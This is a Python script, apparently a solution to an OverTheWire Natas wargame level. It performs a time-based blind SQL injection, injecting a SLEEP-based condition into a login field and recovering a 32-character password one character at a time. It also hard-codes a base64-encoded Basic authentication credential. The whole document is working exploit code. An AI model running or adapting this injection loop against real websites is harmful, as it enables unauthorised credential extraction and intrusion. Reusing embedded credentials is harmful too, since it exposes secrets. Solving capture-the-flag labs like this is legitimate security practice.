import requests

password = ""
header = {
    "Authorization": "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw==",
    "Content-Type": "application/x-www-form-urlencoded"
}
wordlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

query = "natas18\" AND IF( (SELECT BINARY SUBSTRING(password,1,1) FROM users WHERE username=\"natas18\") = \"a\", SLEEP(5), 0) AND \"\"=\""

print("Script started. Waiting for first character...")

while True:

    for i in range(62):
        payload = query[:51] + str(len(password)+1) + query[52:96] + wordlist[i] + query[97:]
        response = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers=header, data={"username": payload})     
        if int(response.elapsed.total_seconds()) >= 5:
            password += wordlist[i]
            print("\nProgress: " + str(len(password)) + "/32 - Password now is: " + password)
            break 

    if len(password) == 32:
        print("\n\nPassword acquired.")
        print("\nThe password is: " + password)
        break

print("\nEnd of script")
